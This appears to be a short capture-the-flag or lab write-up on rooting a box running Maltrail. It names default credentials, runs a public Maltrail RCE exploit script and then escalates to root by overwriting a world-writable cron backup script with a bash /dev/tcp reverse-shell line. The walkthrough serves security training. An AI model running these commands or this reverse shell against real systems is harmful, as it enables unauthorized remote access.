#box

*Created: 1/18/2026*

### Step 1

**Tags:** #Weak-Credentials #Maltrail #RCE #Reverse-Shell

🔗 **URL/Link:** https://github.com/spookier/Maltrail-v0.53-Exploit

**Command:**
```bash
python3 exploit.py 192.168.45.192 8338 http://192.168.184.32:8338
```

*Port: 8338*

> 
> The foothold concerns a default credentails use on Maltrail (with a quick search we discover they are `admin:changeme!`) Once authenticated we discover a vulnerability on [Mailtrail v0.53](https://github.com/spookier/Maltrail-v0.53-Exploit) (even though our version is 0.52). Trying it grants us a shell

---

### Step 2

**Tags:** #cron #World-Writeable #Reverse-Shell

**Command:**
```bash
#!/bin/bash 
/bin/bash -i >& /dev/tcp/192.168.45.192/8338 0>&1
```

> 
> The Privilege Escalation is achieved by leveraging a script which is owned by root but is world-writeable. That script is located at `/var/backups/etc_Backup.sh` and we can easily override it with a reverse shell, getting a root shell
> 
> Since the script is located in `/var/spool/cron/crontabs/` and we can't access it we leverage on `pspy64` to check whether something's running or not

---

